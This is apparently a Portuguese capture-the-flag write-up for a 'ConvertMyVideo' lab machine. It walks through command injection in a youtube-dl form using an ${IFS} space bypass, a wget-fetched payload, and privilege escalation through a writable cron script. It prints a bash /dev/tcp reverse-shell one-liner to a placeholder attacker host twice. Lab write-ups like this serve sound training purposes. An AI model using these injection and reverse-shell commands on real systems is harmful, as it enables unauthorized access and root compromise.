# _**ConvertMyVideo CTF**_
![](convert.jpg)

## _**Enumeração**_
Vamos começar com um scan de rede no endereço IP alvo com <mark>Nmap</mark>
> ```bash
> nmap -p- -T3 [ip_address]
> nmap -p [ports_discovered] -T4 -sV [ip_address]
> ```
![](scan_nmap.jpg)

Temos apenas um website e SSH na porta 22  
Vamos investigar o website para vermos o que temos  

![](mp3_convert.jpg)

Uma única entrada de usuário, uma URL do youtube, para converter o vídeo para MP3  
Tentando um video aleatório, temos:  

![](convert_wrong.jpg)

Tentando listar arquivos do diretório, temos:  

![](file_access_denied.jpg)

Parece que comandos com espaço não são lidos  
O servidor não responde com um erro genérico do tipo _URL inválida_  
Ele retorna um erro detalhado diretamente do binário do sistema: 
* ERROR: Incomplete YouTube ID...
* WARNING: Assuming --restrict-filenames...

Esse erro é gerado explicitamente pela ferramenta de linha de comando **youtube-dl**  

![](no_space.jpg)

Pesquisando por: _Command Injection Bypass Spaces_, temos que ao utilizar **${IFS}**, podemos realizar um _bypass_ deste caractere de espaço  
Como estamos executando comandos direto no servidor, podemos fazer ele buscar nosso arquivo malicioso com:
> ```
> bash -i >& /dev/tcp/[attacker_ip_address]/[port] 0>&1
> ```

Em seguida, vamos utilizar _wget_ para o servidor buscar nosso arquivo via HTTP  

![](payload_send.jpg)

Vamos dar permissões de execução para nosso arquivo

![](exec_perm.jpg)

Agora, só executar ```bash [filename]``` para termos uma _reverse shell!_

![](reverse_shell.jpg)

Vamos transferir a ferramenta <mark>LinPEAS</mark> e executar na máquina-alvo para procurar maneiras de escalar privilégios  
Temos diversos processos _cron_ encontrados na máquina  
Vamos utilizar a ferramenta **pspy** para verificar o que estes processos estão fazendo  
Este processo nos chama a atenção, sendo executado mais de uma vez e em um diretório acessível  

![](bin_clean.jpg)

Investigando, temos o seguinte

![](cron_job_return.jpg)

Vamos adicionar nosso comando com: ```echo 'bash -i >& /dev/tcp/[attacker_ip_address]/[port] 0>&1' > clean.sh```  
Ligamos nosso _listener_ e então, aguardamos a execução do _cronjob_ e obtemos shell privilegiado  

![](root_shell.jpg)

Agora, ir atrás das flags!
